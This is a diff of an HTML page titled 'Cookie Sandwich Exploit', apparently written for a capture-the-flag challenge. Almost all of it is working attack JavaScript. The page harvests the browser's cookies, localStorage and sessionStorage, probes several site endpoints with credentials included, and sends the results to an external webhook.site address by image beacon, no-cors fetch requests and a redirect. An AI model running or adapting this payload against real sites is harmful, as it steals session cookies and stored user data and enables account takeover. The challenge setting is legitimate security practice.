@@ -5,7 +5,7 @@
     <title>Cookie Sandwich Exploit</title>
 </head>
 <body>
-    <h1>Cookie Sandwich Exploit</h1>
+    <h1>2Cookie Sandwich Exploit</h1>
     <div id="status">Setting up cookie sandwich...</div>
     <div id="result"></div>
 
@@ -25,26 +25,34 @@
         
         // Function to exfiltrate data
         function exfiltrate(data) {
-            // Replace with your actual webhook/server URL
+            // Replace with your actual webhook URL
             const exfilUrl = 'https://webhook.site/1f9b4f19-2450-4597-88a2-f1f2a4440af4';
             
-            // Also try to send via GET request in case POST fails
-            const params = new URLSearchParams();
-            params.append('data', JSON.stringify(data));
+            // Try multiple exfiltration methods
             
-            // Try both methods
+            // Method 1: Image-based (most reliable)
+            const img = new Image();
+            img.src = exfilUrl + '?data=' + encodeURIComponent(JSON.stringify(data));
+            
+            // Method 2: Fetch POST (if CORS allows)
             fetch(exfilUrl, {
                 method: 'POST',
+                mode: 'no-cors',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(data)
             }).catch(e => console.log('POST exfil failed:', e));
             
-            // Fallback GET method
-            fetch(exfilUrl + '?' + params.toString()).catch(e => console.log('GET exfil failed:', e));
+            // Method 3: Fetch GET (fallback)
+            fetch(exfilUrl + '?fallback=' + encodeURIComponent(JSON.stringify(data)), {
+                mode: 'no-cors'
+            }).catch(e => console.log('GET exfil failed:', e));
             
-            // Try image-based exfiltration
-            const img = new Image();
-            img.src = exfilUrl + '?cookies=' + encodeURIComponent(document.cookie);
+            // Method 4: Try to redirect to exfil URL (for critical data)
+            if (data.flagFound) {
+                setTimeout(() => {
+                    window.location.href = exfilUrl + '?FLAG_FOUND=' + encodeURIComponent(JSON.stringify(data));
+                }, 1000);
+            }
         }
         
         // Wait for cookies to be processed
@@ -55,60 +63,149 @@
             const allCookies = document.cookie;
             console.log("All cookies:", allCookies);
             
-            // Look for flag patterns
+            // Look for flag patterns in cookie values
             const flagPattern = /flag\{[^}]+\}/i;
             const cubePattern = /cube\{[^}]+\}/i;
             
             let foundFlag = false;
+            let flagValue = null;
             
-            if (flagPattern.test(allCookies)) {
-                console.log("FLAG FOUND IN COOKIES!");
-                document.getElementById('status').innerHTML = '<h2 style="color: green;">FLAG FOUND!</h2>';
+            // Parse individual cookies to find flag
+            const cookies = allCookies.split(';').map(c => c.trim());
+            console.log("Parsed cookies:", cookies);
+            
+            cookies.forEach(cookie => {
+                const [name, value] = cookie.split('=');
+                console.log(`Cookie: ${name} = ${value}`);
+                
+                // Check if any cookie value contains the flag
+                if (value && (flagPattern.test(value) || cubePattern.test(value))) {
+                    console.log(`FLAG FOUND IN COOKIE ${name}:`, value);
+                    foundFlag = true;
+                    flagValue = value;
+                    document.getElementById('status').innerHTML = 
+                        `<h2 style="color: green;">FLAG FOUND IN COOKIE ${name}!</h2>
+                         <p>Value: ${value}</p>`;
+                }
+                
+                // Also check if the cookie name itself contains flag-like content
+                if (name && (flagPattern.test(name) || cubePattern.test(name))) {
+                    console.log(`FLAG FOUND IN COOKIE NAME ${name}`);
+                    foundFlag = true;
+                    flagValue = name;
+                    document.getElementById('status').innerHTML = 
+                        `<h2 style="color: green;">FLAG FOUND IN COOKIE NAME!</h2>
+                         <p>Name: ${name}</p>`;
+                }
+            });
+            
+            // Special check for sandwich cookies that might contain flag data
+            const sandwichPattern = /exploit\d+="[^"]*flag\{[^}]+\}[^"]*"/i;
+            if (sandwichPattern.test(allCookies)) {
+                console.log("FLAG FOUND IN SANDWICH COOKIE!");
                 foundFlag = true;
+                const match = allCookies.match(sandwichPattern);
+                flagValue = match[0];
+                document.getElementById('status').innerHTML = 
+                    `<h2 style="color: green;">FLAG FOUND IN SANDWICH COOKIE!</h2>
+                     <p>Match: ${flagValue}</p>`;
             }
             
-            if (cubePattern.test(allCookies)) {
-                console.log("CUBE FLAG FOUND IN COOKIES!");
-                document.getElementById('status').innerHTML = '<h2 style="color: green;">CUBE FLAG FOUND!</h2>';
-                foundFlag = true;
-            }
+            // Try multiple approaches to get the flag
             
-            // Try the prophecies API
-            fetch('/api/prophecies')
-                .then(response => response.json())
-                .then(data => {
-                    console.log("Prophecies data:", data);
+            // 1. Try the prophecies API with proper domain
+            fetch('http://seekdeep:3000/api/prophecies')
+                .then(response => response.text())
+                .then(text => {
+                    console.log("Prophecies response:", text);
                     
-                    // Check if flag is in prophecies response
-                    const prophecyStr = JSON.stringify(data);
-                    if (flagPattern.test(prophecyStr) || cubePattern.test(prophecyStr)) {
+                    // Check if flag is in response
+                    if (flagPattern.test(text) || cubePattern.test(text)) {
                         console.log("FLAG FOUND IN PROPHECIES!");
                         document.getElementById('status').innerHTML = '<h2 style="color: green;">FLAG IN PROPHECIES!</h2>';
                         foundFlag = true;
                     }
                     
-                    // Display results
-                    document.getElementById('result').innerHTML = 
-                        '<h2>Prophecies:</h2><pre>' + JSON.stringify(data, null, 2) + '</pre>' +
-                        '<h2>All Cookies:</h2><pre>' + allCookies + '</pre>';
-                    
-                    // Exfiltrate everything
+                    // Try to parse as JSON
+                    try {
+                        const data = JSON.parse(text);
+                        console.log("Parsed prophecies:", data);
+                        
+                        // Display results
+                        document.getElementById('result').innerHTML = 
+                            '<h2>Prophecies:</h2><pre>' + JSON.stringify(data, null, 2) + '</pre>' +
+                            '<h2>All Cookies:</h2><pre>' + allCookies + '</pre>';
+                        
+                    // Exfiltrate everything including any flag found
                     exfiltrate({
                         cookies: allCookies,
-                        prophecies: data,
+                        parsedCookies: cookies,
                         flagFound: foundFlag,
+                        flagValue: flagValue,
+                        prophecies: data,
                         timestamp: new Date().toISOString()
                     });
+                } catch (e) {
+                    console.log("Response is not JSON:", e);
+                    
+                    // The response might be HTML that contains flag information
+                    // Check if the raw response contains the flag
+                    if (flagPattern.test(text) || cubePattern.test(text)) {
+                        console.log("FLAG FOUND IN RAW RESPONSE!");
+                        foundFlag = true;
+                        const flagMatch = text.match(flagPattern) || text.match(cubePattern);
+                        flagValue = flagMatch ? flagMatch[0] : 'found but not extracted';
+                        document.getElementById('status').innerHTML = 
+                            `<h2 style="color: green;">FLAG FOUND IN RESPONSE!</h2>
+                             <p>Flag: ${flagValue}</p>`;
+                    }
+                    
+                    // Exfiltrate raw response
+                    exfiltrate({
+                        cookies: allCookies,
+                        parsedCookies: cookies,
+                        flagFound: foundFlag,
+                        flagValue: flagValue,
+                        rawResponse: text.substring(0, 1000), // Limit length
+                        parseError: e.toString(),
+                        timestamp: new Date().toISOString()
+                    });
+                }
                 })
                 .catch(error => {
                     console.error('Prophecies API error:', error);
                     
-                    // Still exfiltrate cookie data
-                    exfiltrate({
-                        cookies: allCookies,
-                        error: error.toString(),
-                        timestamp: new Date().toISOString()
-                    });
+                    // 2. Try relative URL
+                    fetch('/api/prophecies')
+                        .then(response => response.text())
+                        .then(text => {
+                            console.log("Relative prophecies response:", text);
+                            
+                            // Check for flag in relative response
+                            if (flagPattern.test(text) || cubePattern.test(text)) {
+                                console.log("FLAG FOUND IN RELATIVE PROPHECIES!");
+                                foundFlag = true;
+                            }
+                            
+                            // Exfiltrate relative response
+                            exfiltrate({
+                                cookies: allCookies,
+                                relativeResponse: text,
+                                flagFound: foundFlag,
+                                timestamp: new Date().toISOString()
+                            });
+                        })
+                        .catch(err => {
+                            console.log("Relative API also failed:", err);
+                            
+                            // Still exfiltrate cookie data
+                            exfiltrate({
+                                cookies: allCookies,
+                                error: error.toString(),
+                                relativeError: err.toString(),
+                                timestamp: new Date().toISOString()
+                            });
+                        });
                 });
         }, 1000);
         
@@ -117,12 +214,82 @@
             const laterCookies = document.cookie;
             console.log("Later cookies check:", laterCookies);
             
-            if (laterCookies !== document.cookie) {
-                console.log("Cookies changed!");
+            // Try to make requests to different endpoints to see if we can trigger cookie reflection
+            const endpoints = [
+                '/api/prophecies',
+                '/profile',
+                '/social',
+                '/ascend',
+                '/lucky',
+                '/spirit',
+                '/colors',
+                '/riddle'
+            ];
+            
+            Promise.all(endpoints.map(endpoint => {
+                return fetch(endpoint, {
+                    credentials: 'include'
+                }).then(response => response.text())
+                .then(text => ({
+                    endpoint: endpoint,
+                    response: text,
+                    hasFlag: /flag\{[^}]+\}/i.test(text) || /cube\{[^}]+\}/i.test(text)
+                }))
+                .catch(error => ({
+                    endpoint: endpoint,
+                    error: error.toString()
+                }));
+            })).then(results => {
+                console.log("Endpoint scan results:", results);
+                
+                // Check for flags in any responses
+                const flagResults = results.filter(r => r.hasFlag);
+                if (flagResults.length > 0) {
+                    console.log("FLAG FOUND IN RESPONSES!", flagResults);
+                    document.getElementById('status').innerHTML = '<h2 style="color: green;">FLAG FOUND IN RESPONSES!</h2>';
+                }
+                
+                // Exfiltrate all results
                 exfiltrate({
                     laterCookies: laterCookies,
+                    endpointResults: results,
+                    flagFound: flagResults.length > 0,
                     timestamp: new Date().toISOString()
                 });
+            });
+            
+            // Also try to read from localStorage/sessionStorage in case something is stored there
+            try {
+                const localStorage_data = {};
+                const sessionStorage_data = {};
+                
+                for (let i = 0; i < localStorage.length; i++) {
+                    const key = localStorage.key(i);
+                    localStorage_data[key] = localStorage.getItem(key);
+                }
+                
+                for (let i = 0; i < sessionStorage.length; i++) {
+                    const key = sessionStorage.key(i);
+                    sessionStorage_data[key] = sessionStorage.getItem(key);
+                }
+                
+                console.log("Local storage:", localStorage_data);
+                console.log("Session storage:", sessionStorage_data);
+                
+                // Check storage for flags
+                const storageStr = JSON.stringify({localStorage_data, sessionStorage_data});
+                if (/flag\{[^}]+\}/i.test(storageStr) || /cube\{[^}]+\}/i.test(storageStr)) {
+                    console.log("FLAG FOUND IN STORAGE!");
+                    document.getElementById('status').innerHTML = '<h2 style="color: green;">FLAG IN STORAGE!</h2>';
+                }
+                
+                exfiltrate({
+                    localStorage: localStorage_data,
+                    sessionStorage: sessionStorage_data,
+                    timestamp: new Date().toISOString()
+                });
+            } catch (e) {
+                console.log("Storage access failed:", e);
             }
         }, 5000);
     </script>
